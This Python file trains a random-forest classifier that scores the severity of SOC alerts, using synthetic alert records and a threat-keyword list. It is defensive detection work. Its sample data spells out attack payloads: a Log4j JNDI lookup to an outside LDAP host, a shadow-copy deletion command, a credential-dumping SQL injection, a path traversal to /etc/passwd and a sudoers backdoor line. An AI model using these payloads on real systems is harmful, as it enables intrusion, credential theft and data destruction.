import os
import random
import numpy as np
import pandas as pd
import joblib
from pathlib import Path
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import classification_report

MODEL_PATH = Path(__file__).resolve().parent / "model.joblib"

SEVERITY_MAP = {
    0: "LOW",
    1: "MEDIUM",
    2: "HIGH",
    3: "CRITICAL"
}
REVERSE_SEVERITY_MAP = {v: k for k, v in SEVERITY_MAP.items()}

KEYWORDS = [
    "cve", "rce", "remote code", "exploit", "unauthorized", "inject", "drop",
    "mimikatz", "beacon", "reverse_shell", "shadow_copy", "ransomware", "lateral",
    "brute", "failed login", "overflow", "privilege escalation", "eval(", "cmd.exe",
    "bash -i", "scan", "probe", "info", "heartbeat", "keepalive", "ping"
]

def extract_features(df: pd.DataFrame) -> np.ndarray:
    features = []
    for _, row in df.iterrows():
        port = int(row.get("destination_port", 80))
        packets = float(row.get("packet_count", 1))
        failed = float(row.get("failed_attempts", 0))
        
        is_sensitive_port = 1.0 if port in [22, 3389, 445, 1433, 1521, 3306, 5432] else 0.0
        is_web_port = 1.0 if port in [80, 443, 8080, 8443] else 0.0
        is_high_port = 1.0 if port > 1024 else 0.0

        text = f"{row.get('alert_type', '')} {row.get('signature', '')} {row.get('payload_sample', '')}".lower()
        keyword_score = sum(text.count(kw) * (3 if kw in ["rce", "cve", "reverse_shell", "mimikatz", "ransomware"] else 1) for kw in KEYWORDS)

        features.append([
            packets,
            failed,
            port,
            is_sensitive_port,
            is_web_port,
            is_high_port,
            keyword_score
        ])
    return np.array(features)

def generate_synthetic_training_data(n_samples=2500):
    data = []
    scenarios = [
        # CRITICAL
        {"type": "Log4j RCE", "sig": "ET EXPLOIT Apache log4j CVE-2021-44228 JNDI Outbound LDAP", "payload": "${jndi:ldap://198.51.100.4:1389/Exploit}", "port": 443, "packets": 80, "failed": 0, "sev": 3},
        {"type": "Ransomware Lateral Movement", "sig": "ET ATTACK_RESPONSE Mimikatz credential dump via SMB named pipe", "payload": "cmd.exe /c powershell -enc JABzAD0... vssadmin delete shadows /all /quiet", "port": 445, "packets": 350, "failed": 12, "sev": 3},
        {"type": "SQL Injection Admin Dump", "sig": "ET WEB_SPECIFIC_APPS SQL Injection UNION SELECT admin credentials", "payload": "admin' UNION SELECT username, password_hash FROM users--", "port": 80, "packets": 120, "failed": 4, "sev": 3},
        {"type": "C2 Beaconing", "sig": "ET MALWARE Cobalt Strike Malleable C2 Beacon Heartbeat over HTTP", "payload": "GET /api/v1/telemetry?data=enc_aes_key... HTTP/1.1", "port": 8443, "packets": 400, "failed": 0, "sev": 3},
        
        # HIGH
        {"type": "SSH Brute Force", "sig": "SSH Multiple Failed Authentication Attempts from Single IP", "payload": "Failed password for invalid user root from port 52311 ssh2", "port": 22, "packets": 250, "failed": 85, "sev": 2},
        {"type": "RDP Brute Force", "sig": "MS-RDP Account Lockout Spike Distributed", "payload": "NLMPSSType3 Auth Reject Error code 0xC000006A", "port": 3389, "packets": 190, "failed": 45, "sev": 2},
        {"type": "Directory Traversal", "sig": "WEB_CLIENT Path Traversal /etc/passwd Access Attempt", "payload": "GET /../../../../etc/passwd HTTP/1.1", "port": 8080, "packets": 25, "failed": 2, "sev": 2},
        {"type": "Privilege Escalation Attempt", "sig": "LINUX Local Sudoers Modification Attempt unauthorized user", "payload": "echo 'eviluser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "port": 22, "packets": 30, "failed": 3, "sev": 2},

        # MEDIUM
        {"type": "Suspicious User-Agent", "sig": "WEB_CLIENT Suspicious Scanning Tool User Agent detected (sqlmap/nikto)", "payload": "User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)", "port": 80, "packets": 15, "failed": 1, "sev": 1},
        {"type": "Outbound DNS Tunneling Anomaly", "sig": "DNS High Volume Subdomain TXT Resolution Anomaly", "payload": "a1b2c3d4e5f6.tunnel.exfil-data.biz", "port": 53, "packets": 60, "failed": 0, "sev": 1},
        {"type": "SSL Self-Signed Certificate on Internal Node", "sig": "TLS Self-Signed or Expired Certificate presented to corporate client", "payload": "Issuer: CN=TestInternal, Validity Expired", "port": 443, "packets": 8, "failed": 0, "sev": 1},
        
        # LOW
        {"type": "Benign Ping Sweep", "sig": "ICMP Echo Request Ping Sweep standard network monitoring", "payload": "ICMP echo request type 8 code 0 seq 1", "port": 0, "packets": 10, "failed": 0, "sev": 0},
        {"type": "Benign Port Scan", "sig": "TCP SYN Half-Open Port Scan internal vulnerability scanner", "payload": "SYN flag set window 1024 nmap", "port": 80, "packets": 12, "failed": 0, "sev": 0},
        {"type": "Routine Syslog Heartbeat", "sig": "INFO Operational syslog keepalive heartbeat", "payload": "status=HEALTHY uptime=142381s load=0.12", "port": 514, "packets": 1, "failed": 0, "sev": 0},
        {"type": "Benign NTP Drift Sync", "sig": "NTP Time Synchronization Request pool.ntp.org", "payload": "NTP client request version 4 stratum 2", "port": 123, "packets": 2, "failed": 0, "sev": 0}
    ]

    for _ in range(n_samples):
        base = random.choice(scenarios)
        pkt_noise = max(1, int(base["packets"] + random.gauss(0, max(2, base["packets"] * 0.2))))
        failed_noise = max(0, int(base["failed"] + random.gauss(0, max(1, base["failed"] * 0.3))))
        data.append({
            "alert_type": base["type"],
            "signature": base["sig"],
            "payload_sample": base["payload"],
            "destination_port": base["port"],
            "packet_count": pkt_noise,
            "failed_attempts": failed_noise,
            "severity": base["sev"]
        })
    return pd.DataFrame(data)

def train_and_save_model():
    print("Generating synthetic SOC alert dataset...")
    df = generate_synthetic_training_data(n_samples=3000)
    
    X = df[["alert_type", "signature", "payload_sample", "destination_port", "packet_count", "failed_attempts"]]
    y = df["severity"]

    X_features = extract_features(X)

    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X_features)

    clf = RandomForestClassifier(n_estimators=100, max_depth=12, random_state=42)
    clf.fit(X_scaled, y)

    pipeline = {
        "scaler": scaler,
        "classifier": clf
    }

    joblib.dump(pipeline, MODEL_PATH)
    print(f"Model successfully saved to {MODEL_PATH}")

def load_or_train_model():
    if not MODEL_PATH.exists():
        train_and_save_model()
    return joblib.load(MODEL_PATH)

def predict_alert_severity(alert_data: dict) -> dict:
    pipeline = load_or_train_model()
    df = pd.DataFrame([{
        "alert_type": alert_data.get("alert_type", ""),
        "signature": alert_data.get("signature", ""),
        "payload_sample": alert_data.get("payload_sample", ""),
        "destination_port": alert_data.get("destination_port", 80),
        "packet_count": alert_data.get("packet_count", 1),
        "failed_attempts": alert_data.get("failed_attempts", 0)
    }])

    feat = extract_features(df)
    feat_scaled = pipeline["scaler"].transform(feat)
    probs = pipeline["classifier"].predict_proba(feat_scaled)[0]
    pred_class = int(np.argmax(probs))
    confidence = float(probs[pred_class])

    features_dict = {
        "destination_port": alert_data.get("destination_port", 80),
        "packet_count": alert_data.get("packet_count", 1),
        "failed_attempts": alert_data.get("failed_attempts", 0),
        "keyword_score": float(feat[0][6])
    }

    return {
        "ml_severity": SEVERITY_MAP[pred_class],
        "ml_confidence": round(confidence, 4),
        "features_used": features_dict,
        "initial_reasoning": f"Random Forest pre-triage classifier evaluated {alert_data.get('alert_type')} with {confidence*100:.1f}% confidence. Features: Port {features_dict['destination_port']}, Packets: {features_dict['packet_count']}, Failed: {features_dict['failed_attempts']}, Threat Keyword Score: {features_dict['keyword_score']}."
    }

if __name__ == "__main__":
    train_and_save_model()
